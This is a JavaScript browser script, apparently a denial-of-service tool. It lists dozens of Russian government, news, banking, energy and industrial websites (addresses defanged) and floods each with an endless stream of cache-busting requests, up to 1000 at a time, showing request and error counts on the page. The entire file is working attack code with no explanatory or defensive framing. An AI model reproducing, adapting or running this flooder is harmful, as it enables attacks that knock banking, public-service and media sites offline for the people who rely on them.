
var targets = [
  'hxxps://lenta(([.]))ru/',
  'hxxps://ria[.]ru/',
  'hxxps://ria[.]ru/lenta/',
  'hxxps://www[.]rbc[.]ru/',
  'hxxps://www[.]rt[.]com/',
  'hxxp://kremlin[.]ru/',
  'hxxp://en[.]kremlin[.]ru/',
  'hxxps://smotrim[.]ru/',
  'hxxps://tass[.]ru/',
  'hxxps://tvzvezda[.]ru/',
  'hxxps://vsoloviev[.]ru/',
  'hxxps://www[.]1tv[.]ru/',
  'hxxps://www[.]vesti[.]ru/',
  'hxxps://online[.]sberbank[.]ru/',
  'hxxps://sberbank[.]ru/',
  'hxxps://zakupki[.]gov[.]ru/',
  'hxxps://www[.]gosuslugi[.]ru/',
  'hxxps://er[.]ru/',
  'hxxps://www[.]rzd[.]ru/',
  'hxxps://rzdlog[.]ru/',
  'hxxps://vgtrk[.]ru/',
  'hxxps://www[.]interfax[.]ru/',
  'hxxps://www[.]mos[.]ru/uslugi/',
  'hxxp://government[.]ru/',
  'hxxps://mil[.]ru/',
  'hxxps://www[.]nalog[.]gov[.]ru/',
  'hxxps://customs[.]gov[.]ru/',
  'hxxps://pfr[.]gov[.]ru/',
  'hxxps://rkn[.]gov[.]ru/',
  'hxxps://www[.]gazprombank[.]ru/',
  'hxxps://www[.]vtb[.]ru/',
  'hxxps://www[.]gazprom[.]ru/',
  'hxxps://lukoil[.]ru',
  'hxxps://magnit[.]ru/',
  'hxxps://www[.]nornickel[.]com/',
  'hxxps://www[.]surgutneftegas[.]ru/',
  'hxxps://www[.]tatneft[.]ru/',
  'hxxps://www[.]evraz[.]com/ru/',
  'hxxps://nlmk[.]com/',
  'hxxps://www[.]sibur[.]ru/',
  'hxxps://www[.]severstal[.]com/',
  'hxxps://www[.]metalloinvest[.]com/',
  'hxxps://nangs[.]org/',
  'hxxps://rmk-group[.]ru/ru/',
  'hxxps://www[.]tmk-group[.]ru/',
  'hxxps://yandex[.]ru/',
  'hxxps://yandex[.]by/',
  'hxxps://www[.]polymetalinternational[.]com/ru/',
  'hxxps://www[.]uralkali[.]com/ru/',
  'hxxps://www[.]eurosib[.]ru/',
  'hxxps://omk[.]ru/',
  'hxxps://mail[.]rkn[.]gov[.]ru/',
  'hxxps://cloud[.]rkn[.]gov[.]ru/',
  'hxxps://mvd[.]gov[.]ru/',
  'hxxps://pwd[.]wto[.]economy[.]gov[.]ru/',
  'hxxps://stroi[.]gov[.]ru/',
  'hxxps://proverki[.]gov[.]ru/',
  'hxxps://www[.]gazeta[.]ru/',
  'hxxps://www[.]crimea[.]kp[.]ru/',
  'hxxps://www[.]kommersant[.]ru/',
  'hxxps://riafan[.]ru/',
  'hxxps://www[.]mk[.]ru/',
  'hxxps://api[.]sberbank[.]ru/prod/tokens/v2/oauth',
  'hxxps://api[.]sberbank[.]ru/prod/tokens/v2/oidc',
  'hxxps://www[.]vedomosti[.]ru/',
  'hxxps://sputnik[.]by/',
]

var targetStats = {}
targets.forEach((target) => {
  targetStats[target] = { number_of_requests: 0, number_of_errored_responses: 0 }
})

var statsEl = document.getElementById('stats');
function printStats() {
  statsEl.innerHTML = '<table width="100%"><thead><tr><th>URL</th><th>Number of Requests</th><th>Number of Errors</th></tr></thead><tbody>' + Object.entries(targetStats).map(([target, { number_of_requests, number_of_errored_responses  }]) => '<tr><td>' + target + '</td><td>' + number_of_requests + '</td><td>' + number_of_errored_responses + '</td></tr>').join('') + '</tbody></table>'
}
setInterval(printStats, 1000);

var CONCURRENCY_LIMIT = 1000
var queue = []

async function fetchWithTimeout(resource, options) {
  const controller = new AbortController();
  const id = setTimeout(() => controller.abort(), options.timeout);
  return fetch(resource, {
    method: 'GET',
    mode: 'no-cors',
    signal: controller.signal
  }).then((response) => {
    clearTimeout(id);
    return response;
  }).catch((error) => {
    clearTimeout(id);
    throw error;
  });
}

async function flood(target) {
  for (var i = 0;; ++i) {
    if (queue.length > CONCURRENCY_LIMIT) {
      await queue.shift()
    }
    rand = i % 3 === 0 ? '' : ('?' + Math.random() * 1000)
    queue.push(
      fetchWithTimeout(target+rand, { timeout: 1000 })
        .catch((error) => {
          if (error.code === 20 /* ABORT */) {
            return;
          }
          targetStats[target].number_of_errored_responses++;
        })
        .then((response) => {
          if (response && !response.ok) {
            targetStats[target].number_of_errored_responses++;
          }
          targetStats[target].number_of_requests++;
        })

    )
  }
}

// Start
targets.map(flood)